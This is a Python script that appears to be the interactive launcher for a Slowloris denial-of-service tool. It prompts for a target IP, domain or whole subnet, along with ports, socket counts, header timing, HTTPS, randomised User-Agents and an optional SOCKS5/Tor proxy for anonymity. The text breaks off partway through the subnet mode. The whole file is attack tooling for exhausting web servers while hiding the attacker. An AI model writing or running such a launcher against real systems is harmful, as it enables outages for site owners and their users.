# !/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
from src.slowloris_tool.cli import main as cli_main


def ask(prompt: str, default: str = None) -> str:
    if default is None:
        return input(f"{prompt}: ").strip()
    val = input(f"{prompt} [{default}]: ").strip()
    return val or default


def interactive_menu():
    print("Slowloris – choose a mode:")
    print("1) sniper   (single IP)")
    print("2) domain   (domain)")
    print("3) pitchfork(subnet/ports)")
    choice = input("> ").strip()

    if choice == "1":
        sys.argv.append("sniper")
        ip = ask("Target IP")
        port = ask("Port", "80")
        socks = ask("SOCKS5 (e.g., 127.0.0.1:9050) or leave empty", "")
        sys.argv += ["-p", port]
        if socks:
            sys.argv += ["--socks5", socks]
        sys.argv += ["-s", ask("Number of sockets", "150")]
        if ask("Use HTTPS? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["--https"]
        if ask("Randomize User-Agent? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["-ua"]
        sys.argv += ["--sleeptime", ask("Header interval (s)", "15")]
        sys.argv.append(ip)

    elif choice == "2":
        sys.argv.append("domain")
        host = ask("Domain (no protocol)")
        port = ask("Port", "80")
        socks = ask("SOCKS5 (e.g., 127.0.0.1:9050) or leave empty", "")
        sys.argv += ["-p", port]
        if socks:
            sys.argv += ["--socks5", socks]
        sys.argv += ["-s", ask("Number of sockets", "150")]
        if ask("Use HTTPS? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["--https"]
        if ask("Randomize User-Agent? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["-ua"]
        sys.argv += ["--sleeptime", ask("Header interval (s)", "15")]
        sys.argv.append(host)

    elif choice == "3":
        sys.argv.append("pitchfork")
        sys.argv.append(ask("Subnet CIDR (e.g., 192.168.0.0/24)"))
        sys.argv += ["-P", ask("Ports (CSV)", "80,443,8080")]
        sys.argv += ["-s", ask("Sockets per IP/port", "200")]
        if ask("Use HTTPS? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["--https"]
        if ask("Randomize User-Agent? (y/n)", "n").lower().startswith("y"):
            sys.argv += ["-ua"]
